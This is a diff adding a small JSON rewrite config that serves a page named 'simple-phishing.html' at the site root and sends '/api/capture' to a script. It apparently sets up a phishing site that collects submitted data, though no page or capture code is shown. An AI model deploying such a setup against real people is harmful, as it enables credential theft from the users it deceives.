@@ -1,0 +1,6 @@
+{
+  "rewrites": [
+    { "source": "/", "destination": "/simple-phishing.html" },
+    { "source": "/api/capture", "destination": "/api/capture.js" }
+  ]
+}
